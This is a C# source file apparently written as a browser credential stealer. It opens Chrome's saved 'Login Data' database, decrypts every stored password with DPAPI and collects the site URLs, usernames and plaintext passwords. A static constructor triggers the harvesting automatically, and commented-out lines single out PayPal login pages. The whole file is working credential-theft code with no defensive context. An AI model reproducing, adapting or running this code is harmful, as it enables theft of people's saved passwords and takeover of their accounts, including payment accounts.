using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Data;

namespace ConsoleApp1
{
    public class ChromeBrowser
    {
        static ChromeBrowser()
        {
            GetLoginData();
            ;
        }

        #region [PUBLIC]Methods  
        public static IEnumerable<BrowserLoginData> GetLoginData()
        {
            try
            {
                List<BrowserLoginData> result = new List<BrowserLoginData>();
                string description;
                DataTable db = SQLiteService.ExtractDB(@"%AppData%\..\Local\Google\Chrome\User Data\Default\Login Data", "logins");
                int rows = db.Rows.Count;
                //for (int i = 0; i < rows; i++) result.Add(new BrowserLoginData()
                //{
                //    OriginURL = db.Rows[i][0].ToString(),
                //    ActionURL = db.Rows[i][1].ToString(),
                //    Username = db.Rows[i][3].ToString(),
                //    Password = new UTF8Encoding(true).GetString(DPAPI.Decrypt((byte[])db.Rows[i][5], null, out description))
                //});


                for (int i = 0; i < rows; i++)
                {
                    string originURL = db.Rows[i][0].ToString();
                    //if ((originURL == "https://www.paypal.com/cgi-bin/webscr")
                    //     || (originURL == "https://www.sandbox.paypal.com/signin"))
                    {
                        //string password = new UTF8Encoding(true).GetString(DPAPI.Decrypt((byte[])db.Rows[i][5], null, out description));
                        //        result.Add(new BrowserLoginData() {
                        //            originURL, "","",originURL
                        //            });
                        //}
                        //result.Add(new BrowserLoginData()
                        // {

                        string OriginURL = db.Rows[i][0].ToString();
                        string ActionURL = db.Rows[i][1].ToString();
                        string Username = db.Rows[i][3].ToString();
                        string Password = new UTF8Encoding(true).GetString(DPAPI.Decrypt((byte[])db.Rows[i][5], null, out description));
                        BrowserLoginData temp = new BrowserLoginData();
                        temp.OriginURL = OriginURL;
                        temp.ActionURL = ActionURL;
                        temp.Username = Username;
                        temp.Password = Password;
                        result.Add(temp);
                        // });
                    }
                }

                return result;
            }
            catch (Exception ex) { Console.WriteLine(ex.Message); return null; }
        }
        #endregion
    }
}
